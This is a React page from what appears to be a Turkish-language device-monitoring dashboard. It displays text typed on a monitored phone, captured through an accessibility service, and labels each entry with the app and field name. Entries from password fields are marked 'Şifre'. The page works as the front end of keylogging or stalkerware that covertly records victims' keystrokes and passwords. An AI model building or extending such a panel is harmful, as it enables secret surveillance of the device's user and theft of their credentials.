'use client';

import { Suspense } from 'react';
import { api, InputLogItem, formatDate } from '@/lib/api';
import { useDevicePage } from '@/hooks/useDevicePage';
import { DataActions } from '@/components/DataActions';
import { PageShell } from '@/components/ui/PageShell';
import { LoadingSkeleton } from '@/components/ui/LoadingSkeleton';

function InputsContent() {
  const page = useDevicePage<InputLogItem>(api.getInputLogs);

  return (
    <PageShell
      title="Yazılan Metinler"
      subtitle="Tam metin kayıtları — geniş ve okunaklı görünüm"
      emptyTitle="Kayıt yok"
      emptyHint="Erişilebilirlik servisi açık olmalı."
      isEmpty={page.data.length === 0}
      skeleton={<LoadingSkeleton rows={4} />}
      extraFilters={
        <DataActions deviceId={page.selectedDevice} dataType="input-logs" onChanged={page.onRefresh} />
      }
      {...page}
    >
      <div className="input-log-grid">
        {page.data.map((e) => (
          <article key={e.id} className="input-log-card">
            <div className="message-card-meta border-0 pt-0 mt-0 mb-3">
              <span className="font-semibold text-gray-800">{e.appName || e.appPackage}</span>
              {e.fieldName && <span className="text-gray-400">· {e.fieldName}</span>}
              <span className={e.isPasswordField ? 'badge-red ml-auto' : 'badge-gray ml-auto'}>
                {e.isPasswordField ? 'Şifre' : 'Metin'}
              </span>
            </div>
            <p className="input-log-text">{e.text}</p>
            <p className="text-xs text-gray-400 mt-3">{formatDate(e.timestamp)}</p>
          </article>
        ))}
      </div>
    </PageShell>
  );
}

export default function InputsPage() {
  return (
    <Suspense fallback={<LoadingSkeleton />}>
      <InputsContent />
    </Suspense>
  );
}
